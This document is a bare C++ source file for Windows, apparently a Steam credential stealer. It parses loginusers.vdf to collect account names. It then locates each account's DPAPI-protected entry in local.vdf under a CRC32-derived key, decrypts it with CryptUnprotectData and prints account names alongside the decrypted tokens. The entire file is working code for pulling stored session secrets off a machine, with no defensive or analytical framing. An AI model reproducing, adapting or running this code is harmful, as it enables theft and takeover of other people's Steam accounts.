#include <windows.h>
#include <dpapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "crypt32.lib")

uint32_t crc32(const std::string& data) {
    uint32_t crc = 0xFFFFFFFF;
    for (char c : data) {
        crc ^= static_cast<uint8_t>(c);
        for (int i = 0; i < 8; i++) {
            if (crc & 1) crc = (crc >> 1) ^ 0xEDB88320;
            else crc >>= 1;
        }
    }
    return ~crc;
}

std::vector<uint8_t> hex_to_bytes(const std::string& hex) {
    std::vector<uint8_t> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byte_string = hex.substr(i, 2);
        uint8_t b = static_cast<uint8_t>(strtol(byte_string.c_str(), nullptr, 16));
        bytes.push_back(b);
    }
    return bytes;
}

std::string decrypt(const std::vector<uint8_t>& data, const std::string& entropy) {
    DATA_BLOB in;
    in.pbData = const_cast<BYTE*>(data.data());
    in.cbData = static_cast<DWORD>(data.size());

    DATA_BLOB ent;
    ent.pbData = reinterpret_cast<BYTE*>(const_cast<char*>(entropy.c_str()));
    ent.cbData = static_cast<DWORD>(entropy.length());

    DATA_BLOB out;
    if (CryptUnprotectData(&in, nullptr, &ent, nullptr, nullptr, 0, &out)) {
        std::string res(reinterpret_cast<char*>(out.pbData), out.cbData);
        LocalFree(out.pbData);
        return res;
    }
    return "";
}

std::string get_vdf_val(const std::string& content, const std::string& key) {
    size_t pos = content.find("\"" + key + "\"");
    if (pos == std::string::npos) return "";
    pos = content.find("\"", pos + key.length() + 2);
    if (pos == std::string::npos) return "";
    size_t end = content.find("\"", pos + 1);
    if (end == std::string::npos) return "";
    return content.substr(pos + 1, end - pos - 1);
}

void process() {
    char* local;
    size_t len;
    _dupenv_s(&local, &len, "LOCALAPPDATA");
    if (!local) return;

    std::string steam_path = "C:\\Program Files (x86)\\Steam";
    std::string login_users_path = steam_path + "\\config\\loginusers.vdf";
    std::string local_vdf_path = std::string(local) + "\\Steam\\local.vdf";
    free(local);

    std::ifstream login_file(login_users_path);
    std::ifstream local_file(local_vdf_path);
    if (!login_file.is_open() || !local_file.is_open()) return;

    std::stringstream login_ss, local_ss;
    login_ss << login_file.rdbuf();
    local_ss << local_file.rdbuf();
    std::string login_content = login_ss.str();
    std::string local_content = local_ss.str();

    size_t pos = 0;
    while ((pos = login_content.find("\"AccountName\"", pos)) != std::string::npos) {
        size_t start = login_content.find("\"", pos + 13);
        size_t end = login_content.find("\"", start + 1);
        std::string account = login_content.substr(start + 1, end - start - 1);
        
        std::stringstream ss;
        ss << std::hex << crc32(account) << "1";
        std::string key = ss.str();

        std::string token_hex = get_vdf_val(local_content, key);
        if (!token_hex.empty()) {
            std::string decrypted = decrypt(hex_to_bytes(token_hex), account);
            if (!decrypted.empty()) {
                std::cout << account << ":" << decrypted << std::endl;
            }
        }
        pos = end;
    }
}

int main() {
    process();
    return 0;
}